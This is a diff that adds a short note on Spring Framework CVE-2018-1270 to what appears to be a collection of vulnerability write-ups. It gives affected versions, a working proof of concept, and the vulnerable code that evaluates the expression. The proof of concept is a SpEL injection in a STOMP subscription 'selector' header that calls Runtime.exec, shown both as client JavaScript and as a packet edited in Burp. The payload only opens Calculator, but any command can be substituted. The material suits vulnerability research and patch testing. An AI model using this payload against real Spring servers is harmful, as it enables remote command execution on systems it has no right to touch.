@@ -339,4 +339,30 @@ public void streamContent(Path folder, String filename, OutputStream stream) thr
     IOUtils.copy(new FileInputStream(this.getFile(folder, filename)), stream);
 }
 ```
+## Spring Framework
+### CVE-2018-1270 RCE
+Affected Version: < 5.0.5 or 4.3.15  
+Diff: https://github.com/spring-projects/spring-framework/commit/e0de9126ed8cf25cf141d3e66420da94e350708a#   
+POC: 
+```
+app.js -> Add header
+var header = {"selector":"T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')"};
 
+Connect -> use burp to modify packets
+["SUBSCRIBE\nid:sub-0\ndestination:/topic/greetings\nselector:T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')\n\n\u0000"]
+
+send messages...
+```
+Factor: 
+```
+org.springframework.messaging.simp.broker.DefaultSubscriptionRegistry
+private MultiValueMap<String, String> filterSubscriptions(MultiValueMap<String, String> allMatches, Message<?> message) {
+    info = this.subscriptionRegistry.getSubscriptions(sessionId);
+    sub = info.getSubscription(subId);
+    Expression expression = sub.getSelectorExpression();
+    context = new StandardEvaluationContext(message);
+    if (Boolean.TRUE.equals(expression.getValue(context, Boolean.class))) {
+        result.add(sessionId, subId);
+    }
+}
+```
